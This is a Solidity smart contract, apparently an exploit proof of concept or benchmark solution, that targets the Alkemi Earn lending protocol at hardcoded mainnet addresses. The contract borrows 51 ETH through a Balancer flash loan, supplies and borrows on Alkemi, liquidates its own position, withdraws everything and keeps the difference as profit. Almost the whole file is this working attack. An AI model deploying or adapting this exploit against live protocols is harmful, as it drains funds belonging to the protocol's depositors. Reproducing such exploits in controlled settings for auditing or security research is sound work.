// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IAlkemiEarn {
    function supply(address token, uint256 amount) external payable;
    function borrow(address token, uint256 amount) external;
    function getBorrowBalance(address user, address token) external view returns (uint256);
    function liquidateBorrow(address borrower, address borrowAsset, address collateral, uint256 amountClose) external payable;
    function withdraw(address token, uint256 amount) external;
}

contract FlawVerifier {
    IBalancerVault internal constant BALANCER_VAULT =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IAlkemiEarn internal constant ALKEMI = IAlkemiEarn(0x4822D9172e5b76b9Db37B75f5552F9988F98a888);
    address internal constant AWETH = 0x8125afd067094cD573255f82795339b9fe2A40ab;

    uint256 internal constant FLASH_LOAN_AMOUNT = 51 ether;
    uint256 internal constant SUPPLY_AMOUNT = 50 ether;
    uint256 internal constant BORROW_AMOUNT = 39.5 ether;

    uint256 internal realizedProfit;
    bool internal executing;
    bool internal executed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        executed = true;
        executing = true;

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_LOAN_AMOUNT;

        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, bytes(""));

        executing = false;
        realizedProfit = address(this).balance;
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(BALANCER_VAULT), "not vault");
        require(executing, "not executing");
        require(amounts.length == 1 && feeAmounts.length == 1, "unexpected arrays");

        WETH.withdraw(amounts[0]);

        ALKEMI.supply{value: SUPPLY_AMOUNT}(AWETH, SUPPLY_AMOUNT);
        ALKEMI.borrow(AWETH, BORROW_AMOUNT);

        uint256 debt = ALKEMI.getBorrowBalance(address(this), AWETH);

        ALKEMI.liquidateBorrow{value: debt}(address(this), AWETH, AWETH, debt);
        ALKEMI.withdraw(AWETH, type(uint256).max);

        uint256 repayment = amounts[0] + feeAmounts[0];
        WETH.deposit{value: repayment}();
        require(WETH.transfer(address(BALANCER_VAULT), repayment), "repay failed");
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    receive() external payable {}
}
